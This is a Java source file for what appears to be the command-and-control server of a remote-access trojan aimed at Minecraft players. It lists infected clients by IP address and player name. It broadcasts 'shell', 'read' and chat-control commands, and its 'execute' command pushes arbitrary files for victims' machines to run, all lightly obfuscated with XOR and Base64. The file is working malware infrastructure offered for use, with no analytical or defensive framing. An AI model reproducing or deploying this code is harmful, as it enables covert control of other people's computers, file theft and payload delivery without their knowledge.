package me.soda.server.handlers;

import me.soda.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class CommandHandler {
    public static boolean encrypt = true;
    static List<WebSocket> connCollection;

    private void tryBroadcast(String message, Server server) {
        if (encrypt) {
            byte[] encrypted = Server.xor.encrypt(message);
            server.broadcast(encrypted, connCollection);
        } else server.broadcast(message, connCollection);
    }

    public boolean handle(String in, Server server) {
        boolean stop = false;
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop":
                        server.stop();
                        stop = true;
                        break;
                    case "conn":
                        if (msgArr.length == 1) {
                            Server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> {
                                int index = conn.<Integer>getAttachment();
                                String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
                                Server.log(String.format("IP: %s, ID: %s, Player:%s", address, index, Server.clientMap.get(conn).playerName));
                            });
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "sel" -> {
                                    connCollection = new ArrayList<>();
                                    if (msgArr[2].equals("all")) {
                                        connCollection.addAll(server.getConnections());
                                        Server.log("Selected all clients!");
                                        break;
                                    }
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> connCollection.add(conn));
                                    Server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> conn.send("kill"));
                                    Server.log("Client " + msgArr[2] + " disconnected");
                                }
                                default -> {
                                }
                            }
                        }
                        break;
                    case "chat":
                    case "chat_control":
                    case "chat_filter":
                    case "shell":
                    case "read":
                        if (msgArr.length < 2) break;
                        String[] strArr = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(
                                String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), server);
                        break;
                    case "execute":
                        if (msgArr.length < 2) break;
                        String[] strArr2 = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr2, 0, strArr2.length);
                        File file = new File(String.join(" ", strArr2));
                        FileInputStream is = new FileInputStream(file);
                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()), server);
                        break;
                    default:
                        tryBroadcast(in, server);
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return stop;
    }
}
